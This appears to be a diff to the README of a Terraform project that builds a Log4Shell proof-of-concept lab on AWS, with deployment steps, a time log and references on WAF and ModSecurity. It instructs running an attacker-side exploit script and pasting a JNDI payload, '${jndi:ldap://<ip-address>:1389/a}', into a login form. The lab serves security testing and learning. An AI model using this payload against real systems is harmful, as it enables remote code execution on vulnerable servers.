@@ -55,15 +55,24 @@ Linux:
  `terraform init`    
  `terraform apply`   
 
-Ensure `http:<aws host url>:8080` is accessible
+ After running, an IP / DNS will be listed.
+
+For single-instance, ensure `http:<aws host url>:8080` is accessible  
+
+For double-instance, ensure `http:<aws host url>` is accessible  
+
+\* please note that spining up 'double-instance' takes a lot more time, can use `journalctl -f` after ssh into the system to track progress
+  
+If you do follow journal, "Reached target Cloud-init target." means its ready state.  
+![exploit](./images/ready_state_double-instance-journal.png|width=70) 
 
 ## Prepare Remote / Localhost client (attacker):
-Set execute permission  (in same workdir= single-instance)
-`chmod +x exploit-script-remote.sh`    
+Set execute permission
+`chmod +x ../exploit-script-remote.sh`    
 
-Run script with 2 supplied variable   
-`./exploit-script-remote.sh <1: desktop | cloud>`  
-where desktop means your workdir is at Desktop and cloud means your workdir at ~/
+Run script with supplied variable   
+`../exploit-script-remote.sh <desktop | cloud>`  
+where desktop means your workdir is at Desktop and cloud means your workdir at ~.
 
 Note the payload is displayed end of script similar to `${jndi:ldap://<ip-address>:1389/a}`
 
@@ -72,7 +81,7 @@ Visit `http:<aws host url>:8080`
 
 Copy the payload into the 'username' field then submit forms  
 
-![exploit](https://github.com/moshuum/tf-log4j-aws-poc/blob/main/images/Screenshot%202022-06-07%20034332.png?raw=true)
+![exploit](./images/attempt-exploit.png|width=70) 
 
 
 ## Remark 
@@ -80,7 +89,7 @@ JDK file: have ensure the integrity from baidu source is same hash from Oracle
 SHA256          187EDA2235F812DDB35C352B5F9AA6C5B184D611C2C9D0393AFB8031D8198974
 
 ## References
-Instance
+Instance:
 https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance
 
 
@@ -88,22 +97,25 @@ Spot instance:
 https://www.tderflinger.com/en/ec2-spot-with-terraform
 
 
-SSh to verify
+SSH:
 https://jhooq.com/terraform-ssh-into-aws-ec2/
 https://docs.aws.amazon.com/cli/latest/userguide/cli-services-ec2-keypairs.html
+
 
 [ssh key on the fly]
 https://stackoverflow.com/questions/49743220/how-do-i-create-an-ssh-key-in-terraform
 
-Waf
+
+Waf:
 https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/waf_rule
 https://medium.com/kudos-engineering/terraforming-amazons-web-application-firewall-e5c22b7d317d
 https://www.linode.com/docs/guides/securing-nginx-with-modsecurity/
 
-Templating
+
+Templating:
 https://spacelift.io/blog/terraform-templates
 
-AWS AZ ID
+AWS AZ ID:
 https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-availability-zones 
 
 # Things learnt
@@ -115,11 +127,9 @@ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-z
 * (lots of time spent) Setting up and Troublehouting networking take lots of time - Route, vpc need 1 sec-group and ec2 host need another sec-group - and both sec-group need to point to vpc
 
 
-* 
-
 # # Time keeping
 * Start 06 Jun 11AM UTC+0800 - 07 Jun 4AM (Completed poc+tf+aws -waf) - 17 hours
-* Start 07 Jun 1PM UTC+0800
+* Start 07 Jun 1PM UTC+0800 - 08 Jun 5AM (Completed 2nd case where a reverse proxy is used)
 
 
 
